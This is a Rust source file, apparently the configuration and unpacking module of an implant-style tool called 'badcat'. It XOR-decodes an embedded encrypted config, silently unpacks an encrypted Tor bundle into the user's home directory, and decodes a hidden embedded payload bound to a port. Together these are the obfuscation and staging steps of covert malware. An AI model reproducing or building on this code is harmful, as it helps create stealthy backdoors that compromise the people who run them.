use std::path::PathBuf;
use std::{error, io};

use crate::config;
use badcat_lib::xor;

pub struct Setting {
    pub key: String,
    pub tor_dir: PathBuf,
    pub torrc: String,
    pub uses_payload: bool,
    pub payload_port: u16,
}

impl Setting {
    pub fn new() -> Result<Setting, Box<dyn error::Error>> {
        let setting = load_settings()?;

        std::fs::create_dir_all(&setting.tor_dir)?;

        unbundle(&setting)?;

        Ok(setting)
    }

    pub fn decode_payload(&self) -> Result<Vec<u8>, Box<dyn error::Error>> {
        let enc_payload = config::ENC_PAYLOAD.to_owned();
        let buf = xor::decode_bytes(&self.key, &enc_payload)?;
        Ok(buf)
    }
}

pub fn load_settings() -> Result<Setting, Box<dyn error::Error>> {
    let key = config::ENC_KEY.to_owned();

    let data = xor::decode(
        &key,
        &config::ENC_DATA.to_owned(),
    )?;

    let data = json::parse(&data)?;

    let tor_dir = String::from(data["tor_dir"].as_str().unwrap());
    let torrc = String::from(data["torrc"].as_str().unwrap());
    let uses_payload = data["uses_payload"].as_bool().unwrap_or(false);
    let payload_port = data["payload_port"].as_u16().unwrap_or(0);

    let setting = Setting {
        key,
        torrc,
        tor_dir: expand_user_dir(&tor_dir),
        uses_payload,
        payload_port,
    };

    Ok(setting)
}

fn unbundle(setting: &Setting) -> Result<(), Box<dyn error::Error>> {
    let enc_bundle = config::ENC_BUNDLE.to_owned();

    let buf = xor::decode_bytes(&setting.key, &enc_bundle)?;

    let mut archive = tar::Archive::new(io::Cursor::new(&buf));
    archive.unpack(&setting.tor_dir)?;

    Ok(())
}

fn expand_user_dir(path: &String) -> PathBuf {
    let mut home_dir = match dirs::home_dir() {
        Some(d) => d,
        None => panic!("problem finding home user directory"),
    };

    home_dir.push(PathBuf::from(path));
    home_dir
}
